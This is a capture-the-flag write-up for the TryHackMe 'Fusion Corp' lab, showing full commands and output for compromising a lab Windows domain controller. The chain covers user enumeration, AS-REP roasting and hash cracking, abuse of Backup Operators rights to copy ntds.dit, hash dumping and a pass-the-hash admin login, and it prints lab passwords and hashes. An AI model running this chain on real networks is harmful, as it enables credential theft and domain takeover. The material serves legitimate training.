### Fusion Crop

![image](https://user-images.githubusercontent.com/5285547/122137683-1f656e00-ce3d-11eb-9e38-8ad66e83b6ee.png)

[Room Link](https://tryhackme.com/room/fusioncorp)  
Created by: [MrSeth6797](https://tryhackme.com/p/MrSeth6797)

## Enumeration

### Nmap

```bash
nmap -p- 10.10.222.16 
```
```bash
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49669/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49691/tcp open  unknown
49698/tcp open  unknown
```

### Gobuster

```bash
gobuster dir -u "http://10.10.222.16/"  -w  /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x txt,html,gz,php,js,zip,img,bak,opvn
```
```bash
/index.html           (Status: 200) [Size: 53888]
/blog.html            (Status: 200) [Size: 22163]
/img                  (Status: 301) [Size: 147] [--> http://10.10.222.16/img/]
/css                  (Status: 301) [Size: 147] [--> http://10.10.222.16/css/]
/Index.html           (Status: 200) [Size: 53888]                             
/lib                  (Status: 301) [Size: 147] [--> http://10.10.222.16/lib/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.222.16/js/] 
/Blog.html            (Status: 200) [Size: 22163]                             
/backup               (Status: 301) [Size: 150] [--> http://10.10.222.16/backup/]
```

## User 1

In /backups we find a list of employees 

![image](https://user-images.githubusercontent.com/5285547/122767322-72ef1600-d29a-11eb-9539-d73b287f58f3.png)

![image](https://user-images.githubusercontent.com/5285547/122768231-4f789b00-d29b-11eb-9fdd-6bbc9119999b.png)

Extracting the names using regex I put the usernames into a new file called users.txt, so I can use windows tools to start to enumerate for any valid users. 

## Domain name

This can be seen in nmap output or via a quick ldapsearch

### ldapserach

```bash
ldapsearch -x -h 10.10.222.16 -s base namingcontexts
```
```bash
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=fusion,DC=corp
namingcontexts: CN=Configuration,DC=fusion,DC=corp
namingcontexts: CN=Schema,CN=Configuration,DC=fusion,DC=corp
namingcontexts: DC=DomainDnsZones,DC=fusion,DC=corp
namingcontexts: DC=ForestDnsZones,DC=fusion,DC=corp

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
``

Add fusion.corp to /etc/hosts

```bash
sudo nano /etc/hosts
```

### Finding a valid user

[Kerbrute Tool](https://github.com/ropnop/kerbrute)

Install
```
go get github.com/ropnop/kerbrute
```

```bash
./kerbrute userenum -d 'fusion.corp' --dc 10.10.33.48 ~/users.txt
```

![image](https://user-images.githubusercontent.com/5285547/122769576-91eea780-d29c-11eb-9a3a-8066ab594014.png)


## User 1

```
lparker@fusion.corp
```

### Making a new users.txt file with just "lparker" our valid user name, I use a tool "GetNPUsers.py" to do a asreproast attack. 

```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py 'fusion.corp/' -usersfile ~/users.txt -no-pass -dc-ip 10.10.222.16 -format hashcat -outputfile hashes.asreproast
```

### We get the hash

```cat hashes.asreproast```                                                  

```
$krb5asrep$23$lparker@FUSION.CORP:86658453c7705714369e31d6bd1cd144$728e7c5e2ae3648d5b0b3056b3f76c611141091a620dd460ff30bc8c1dd140c156f671ce414e23c52b1101fa834989668947194ec5bcfb8131acd2ec4fadedb535b6d8695e3bc941a8256537840c167890adb420516882f74af905fce6ada1a7623d8ca7b916c7536edefb2f95c54fea38671d860aad2dd7b307d828a891aed3b9ebba49a24694fb15a61bcf1231a135283eeb754540d6083384a486c7b3e0b541dfc00cbf26d6d460525a52261d83c1a25c3e1bd5577010b987ca026937d0467886f9fe3eb91a790fcf0b6120d7a93d021851c4d4217d63bb9e0c0dc4401e1139d3dff01ada7d3871cd
```

### Crack the hash! 

```
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -O 
```

```
$krb5asrep$23$lparker@FUSION.CORP:86658453c7705714369e31d6bd1cd144$728e7c5e2ae3648d5b0b3056b3f76c611141091a620dd460ff30bc8c1dd140c156f671ce414e23c52b1101fa834989668947194ec5bcfb8131acd2ec4fadedb535b6d8695e3bc941a8256537840c167890adb420516882f74af905fce6ada1a7623d8ca7b916c7536edefb2f95c54fea38671d860aad2dd7b307d828a891aed3b9ebba49a24694fb15a61bcf1231a135283eeb754540d6083384a486c7b3e0b541dfc00cbf26d6d460525a52261d83c1a25c3e1bd5577010b987ca026937d0467886f9fe3eb91a790fcf0b6120d7a93d021851c4d4217d63bb9e0c0dc4401e1139d3dff01ada7d3871cd:!!abbylvzsvs2k6!
```

### Login

```bash
evil-winrm -i 10.10.222.16 -u lparker -p '!!abbylvzsvs2k6!'
```

![image](https://user-images.githubusercontent.com/5285547/122771047-f6f6cd00-d29d-11eb-86b6-b74becdb92ad.png)

And grab our first flag

![image](https://user-images.githubusercontent.com/5285547/122771150-1261d800-d29e-11eb-9c78-3a544893cc59.png)

## User 2

```bash
pip install ldapdomaindump

ldapdomaindump 10.10.222.16 -u 'fusion.corp\lparker' -p '!!abbylvzsvs2k6!' --no-json --no-grep
```

```
firefox domain_users.html 
```

![image](https://user-images.githubusercontent.com/5285547/122771579-7be1e680-d29e-11eb-8ad5-f24a56bb48de.png)

We see the password for the next user in the description field. 

```
evil-winrm -i 10.10.222.16 -u jmurphy -p 'u8WC3!kLsgw=#bRY'
```

![image](https://user-images.githubusercontent.com/5285547/122771801-adf34880-d29e-11eb-8496-f5d21481bc45.png)


## Root/Admin

In the screenshot, you already saw, that jmurphy is a member of the group Backup Operators. Lets use this group to create a backup of the file NTDS.dit which contains all hashes (this file is used by some process and therefore can’t be read directly, so you need a backup). First create a file called diskshadow.txt and don’t forget to add a space after each line:

![image](https://user-images.githubusercontent.com/5285547/122772228-0fb3b280-d29f-11eb-8e83-1793653a4dc8.png)

```
diskshadow.exe /s .\diskshadow.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  FUSION-DC,  6/21/2021 6:44:34 AM

-> set metadata C:\tmp\tmp.cabs
-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
Alias someAlias for shadow ID {613f6c43-7139-4153-9687-91ecb550c31d} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {3f14ee17-9231-4b76-ae74-59cd1ab7da64} set as environment variable.

Querying all shadow copies with the shadow copy set ID {3f14ee17-9231-4b76-ae74-59cd1ab7da64}

        * Shadow copy ID = {613f6c43-7139-4153-9687-91ecb550c31d}               %someAlias%
                - Shadow copy set: {3f14ee17-9231-4b76-ae74-59cd1ab7da64}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{66a659a9-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 6/21/2021 6:44:40 AM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: Fusion-DC.fusion.corp
                - Service machine: Fusion-DC.fusion.corp
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %someAlias% z:
-> %someAlias% = {613f6c43-7139-4153-9687-91ecb550c31d}
The shadow copy was successfully exposed as z:\.
```

The backup NTDS.dit can’t be copied because of permissions:

```
Path   : Microsoft.PowerShell.Core\FileSystem::Z:\windows\ntds\ntds.dit
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:AI(A;ID;FA;;;SY)(A;ID;FA;;;BA)
```

We need another tool to bypass this (our backup privilege allows to change permissions). On kali, we need to download compiled dll files from a github repo. These allow to copy NTDS.dit which is only readable by an Admin

```
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```

Evil-winRM
```
*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege z:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite
```

In order to decrypt the NTDS.dit, you need the SYSTEM file too

```
*Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system
```

Download the files. 

```
download ntds.dit
download system
```

Dump the Hash's

```
python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL 

Impacket v0.9.23.dev1+20210517.123049.a0612f00 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FUSION-DC$:1000:aad3b435b51404eeaad3b435b51404ee:06dad9b238c644fdc20c7633b82a72c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:feabe44b40ad2341cdef1fd95297ef38:::
fusion.corp\lparker:1103:aad3b435b51404eeaad3b435b51404ee:5a2ed7b4bb2cd206cc884319b97b6ce8:::
fusion.corp\jmurphy:1104:aad3b435b51404eeaad3b435b51404ee:69c62e471cf61441bb80c5af410a17a3:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:4db79e601e451bea7bb01d0a8a1b5d2950992b3d2e3e750ab1f3c93f2110a2e1
Administrator:aes128-cts-hmac-sha1-96:c0006e6cbd625c775cb9971c711d6ea8
Administrator:des-cbc-md5:d64f8c131997a42a
FUSION-DC$:aes256-cts-hmac-sha1-96:3512e0b58927d24c67b6d64f3d1b71e392b7d3465ae8e9a9bc21158e53a75088
FUSION-DC$:aes128-cts-hmac-sha1-96:70a93c812e563eb869ba00bcd892f76a
FUSION-DC$:des-cbc-md5:04b9ef07d9e0a279
krbtgt:aes256-cts-hmac-sha1-96:82e655601984d4d9d3fee50c9809c3a953a584a5949c6e82e5626340df2371ad
krbtgt:aes128-cts-hmac-sha1-96:63bf9a2734e81f83ed6ccb1a8982882c
krbtgt:des-cbc-md5:167a91b383cb104a
fusion.corp\lparker:aes256-cts-hmac-sha1-96:4c3daa8ed0c9f262289be9af7e35aeefe0f1e63458685c0130ef551b9a45e19a
fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
[*] Cleaning up... 
```

## Root/Admin login

```
evil-winrm -i 10.10.222.16 -u administrator -H 9653b02d945329c7270525c4c2a69c67
```

We can get the last flag now! 



